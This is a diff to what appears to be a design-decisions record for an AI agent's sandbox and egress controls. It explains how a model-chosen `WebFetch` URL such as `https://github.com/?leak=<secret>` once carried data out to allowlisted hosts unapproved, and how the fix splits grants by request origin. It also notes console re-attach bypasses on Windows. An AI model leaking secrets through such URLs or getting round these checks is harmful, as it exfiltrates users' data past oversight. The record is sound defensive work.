@@ -21,6 +21,7 @@
 | Q-369-lease / core#369 | quarantine the unrecoverable lease, or declare the wedge? | **DECLARE IT, and make the cause READABLE.** | Same disposition as Q-368-honesty for the same reason: `#369` c1 is lease-recovery surgery inside the AppContainer backend. `#369` c2 is NOT — a bare `bool` that hid a recorded cause for twelve days is a product-honesty defect on a surface every operator reads, so c2 is CLOSED here (`sandbox status` prints the recorded probe cause, human and `--json`). Obliges: c1, c3 and c4 stay OPEN on `#369`; the wedge is declared in `known_limitations` so no future operator loses a fortnight rediscovering it |
 | Q-369c4 / core#369 c4 | what to do about the package ACEs already leaked onto a home directory | **TELL THE OPERATOR WHERE TO LOOK; do not auto-revoke.** | An automatic sweep of `S-1-15-2-*` ACEs across a user's home directory is a destructive, unattended, privileged operation whose blast radius is the whole profile, written to repair a defect measured exactly once. The leaked ACE grants a package SID that no longer has a profile, so it is inert until an AppContainer with the same SID is recreated. Obliges: the wedged-lease limitation names the lease directory so an operator can find the recorded intents; `#369` c3 (find what recorded a whole-home grant) stays open and is the thing actually worth fixing — a revocation tool for a leak still being produced is treating the symptom |
 | Q-389c2 / core#389 | Windows quarantine console: reach c1's property, or take c2's branch? | **TAKE c2 — LABEL the prompt. c1 is unreachable.** | `#389` measured both remedies foreclosed: reparenting is defeated by `AttachConsole(<pid>)` and a private console by `FreeConsole()` first. Windows has no session-leader equivalent, and the AppContainer route is closed by the decision above. PRODUCT COST, stated: this does NOT stop a determined child re-attaching to the operator's console — it only lets the operator ATTRIBUTE what appears. It also costs one unconditional stderr line per quarantine `git` spawn on Windows, which is noise on a non-interactive host, accepted because a notice that fires only when it guesses a human is watching is a notice that is absent exactly when it is wrong about that. Obliges: `#389` c1 stays OPEN and NOT-MET, and the residual pin measuring the bypass is KEPT, not deleted |
+| Q-1264 / wayland#1264 | is an allowlisted apex admitted on the host match alone for MODEL-chosen URLs too? | **NO — split the grant by request ORIGIN, not by client** | Stamp origin centrally on the request; keep product traffic's unconditional allow; only `WebFetch` is model-directed today |
 
 ## D-379 — the teardown Q-338c4 owed and did not record
 
@@ -158,3 +159,56 @@ than it delivers. #244 c4's text now states the scope at which the property hold
 so the day it closes, someone re-grades instead of quietly agreeing. Scope of the "no": Linux (bwrap)
 and macOS (sandbox-exec) both enforce read-deny at their shipping default, so the exemption is inert
 there, and every non-local principal on Windows is still refused.
+
+## Why Q-1264 splits the grant by ORIGIN and not by client
+
+`classify()` returned `Allow` the moment the host matched the allowlist — above the body-method
+check and above the path/query check. That early return was the ONLY call-site guard for
+`get_carries_data`, so for a host on the shipped 38-entry default set the shape checks were
+unreachable. `WebFetch` is GET-only but takes its whole URL out of tool input, and `github.com`,
+`notion.so` and `linear.app` all ship on that set, so
+`WebFetch https://github.com/?leak=<secret>` was admitted with no approval in any mode.
+
+**Measured, not modelled.** With the fix reverted in place, the end-to-end arm
+(`issue_1264_model_directed_egress_test`) fetched `https://github.com/?leak=<24-char token>` over
+the real network and came back `Ok { status: 200 }`. The issue itself was filed with the caveat
+"graded from source reading, not a live run"; that gap is now closed in the direction that matters.
+
+**Taken: the split, in the form the issue's c2/c3 describe — but keyed on the REQUEST, not the
+client.** Two shapes were considered and one was refused:
+
+- REFUSED — split the POLICY per client (a provider policy and a tool policy). Two independent
+  external reviews refuted it and the reason holds: the boundary would then depend on who
+  constructed the client, so any code path that got hold of a provider-built client would inherit
+  the provider grant. That is a bypass factory rather than a boundary.
+- TAKEN — one policy, one allowlist, one classifier, plus one more FACT about the request.
+  `EgressOrigin` is stamped by the issuing `EgressClient` and copied into every request by
+  `EgressRequestBuilder`. No call site sets it, so a tool cannot claim to be provider traffic by
+  choosing how it sends.
+
+**Product traffic keeps its unconditional allow, deliberately.** The allowlist is how an operator
+authorises their own provider, channel, MCP and API-tool destinations. Shape-checking those would
+refuse the agent's own LLM POSTs — the issue names this and it is why "just narrow the allowlist"
+was never available. `provider_traffic_to_the_same_apex_keeps_its_unconditional_allow` is the
+wrong-refusal control and fails if that grant is ever lost.
+
+**Exactly one backend is model-directed today, and that is a judgement, not a discovery.**
+`HttpFetchBackend` does `self.client.get(&req.url)` with the URL verbatim from tool input — host,
+path and query all model-chosen. The scoped API backends (`http_github`, `http_gitlab`,
+`http_notion`, `http_linear`) build their URL with `format!` against a fixed host with
+percent-encoded path segments, so an operator's allowlist entry for that host authorises exactly
+the traffic that follows; `a_scoped_api_backend_is_not_model_directed` pins that reading so the
+distinction is graded rather than assumed. A new backend that fetches a model-supplied URL must
+pass `EgressOrigin::ModelDirected` to `build_ssrf_safe_tool_client_with_origin`. **That opt-in is
+not self-enforcing** — this is the residual risk of the shape and it is recorded rather than
+papered over: the default is `Product`, so a future model-URL surface that forgets the stamp is
+admitted. Making it fail closed instead would mean shape-checking all 132 client construction
+sites, which refuses the product's own traffic. `the_shipped_web_fetch_backend_carries_the_model_directed_stamp`
+pins the one call site that exists, and both mutations — reverting the classifier branch, and
+reverting the stamp — were run and produce RED, on different arms.
+
+**`Ask` grew an unattended fallback, because "nobody is here to ask" cannot mean one thing for
+both cases.** `resolve_ask` returned `Allow` with no doorbell wired, which is right for a
+data-less read to a new destination: nothing sensitive leaves. It is exactly wrong for a
+model-chosen URL carrying data, where an unattended run is the attack's precondition. Only that
+class refuses; the pre-existing behaviour is otherwise unchanged.
